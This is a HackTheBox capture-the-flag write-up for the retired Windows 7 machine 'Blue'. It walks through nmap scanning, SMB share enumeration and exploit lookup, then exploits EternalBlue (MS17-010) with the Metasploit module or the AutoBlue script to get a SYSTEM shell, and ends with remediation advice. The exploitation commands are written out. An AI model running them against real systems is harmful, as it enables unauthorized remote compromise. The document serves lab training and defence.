+++
title = "HackTheBox - Blue Writeup"
date = "2026-03-31"
description = "Exploiting Windows 7 via EternalBlue (MS17-010 / CVE-2017-0143) SMB vulnerability"
tags = ["HackTheBox", "CTF", "Windows", "EternalBlue", "MS17-010", "CVE-2017-0143", "SMB", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++
Machine Info
FieldDetailsMachineBlueOSWindows 7DifficultyEasyCategoryRetiredVulnerabilityMS17-010 / EternalBlue (CVE-2017-0143)

Overview
Blue is one of the most iconic machines on HackTheBox. It targets the EternalBlue (MS17-010) vulnerability — the same exploit used by the WannaCry ransomware outbreak in 2017. A critical unauthenticated RCE in Windows SMBv1, it grants immediate SYSTEM access with no credential or privilege escalation required.

Reconnaissance
Nmap Scan
Start with a service and version detection scan to map the attack surface.
bashnmap -sV 10.xxx.xxx.xxx
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC

Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Key observations:

Port 445/tcp (SMB) is open
OS fingerprinted as Windows 7
Hostname is HARIS-PC
No RDP or other interactive services exposed — SMB is the sole attack surface


Vulnerability Scanning
Available SMB NSE Scripts
Nmap ships with a rich set of SMB-specific scripts.
bashls /usr/share/nmap/scripts | grep smb
Notable entries include smb-vuln-ms17-010.nse, smb-vuln-ms08-067.nse, and several others useful for SMB enumeration.
Running the Vuln Scripts
bashnmap --script vuln -p445 10.xxx.xxx.xxx
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
MS17-010 confirmed. CVE-2017-0143 allows an unauthenticated attacker to send specially crafted packets to SMBv1, triggering a buffer overflow that leads to arbitrary code execution as SYSTEM.

SMB Enumeration
List available shares using a null session.
bashsmbclient -L //10.xxx.xxx.xxx -N
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk
Users           Disk
Two non-default shares — Share and Users — are present and worth noting for post-exploitation file retrieval.

Exploit Research
bashsearchsploit ms17-010
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB RCE (Metasploit) | windows/remote/43970.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)             | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB RCE (MS17-010)          | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB RCE (MS17-010)                    | windows_x86-64/remote/42030.py
Multiple options are available. The Metasploit module is the most reliable path for this machine.

Exploitation
Using Metasploit
bashmsfconsole
use exploit/windows/smb/ms17_010_eternalblue
set LHOST 10.xxx.xxx.xxx
set RHOSTS 10.xxx.xxx.xxx
run
A Meterpreter session opens with NT AUTHORITY\SYSTEM — no privilege escalation needed.
Alternative: AutoBlue (No Metasploit)
bashgit clone https://github.com/l4ughingc4t/AutoBlue-MS17-010
AutoBlue is a standalone Python implementation of EternalBlue that does not rely on Metasploit.

Flag Retrieval
bash# User flag
type C:\Users\haris\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt

Summary
StepTool / CommandPort scannmap -sVVuln detectionnmap --script vuln -p445Share enumerationsmbclient -LExploit searchsearchsploit ms17-010ExploitationMetasploit ms17_010_eternalblueResultSYSTEM shell — no privesc required
Key Takeaways

EternalBlue is a pre-authentication RCE that yields SYSTEM immediately — the same primitive behind WannaCry and NotPetya
SMBv1 is disabled by default on modern Windows, but many unpatched or misconfigured systems still expose it
The -oN flag in Nmap is good practice — always save scan output for reference during an engagement
Null session enumeration (-N) against SMB can reveal share structure before any exploit is attempted

Remediation

Apply Microsoft patch MS17-010 (KB4012212 for Windows 7)
Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
Block inbound access to ports 139 and 445 at the network perimeter
Enable Windows Firewall and restrict lateral SMB traffic between hosts
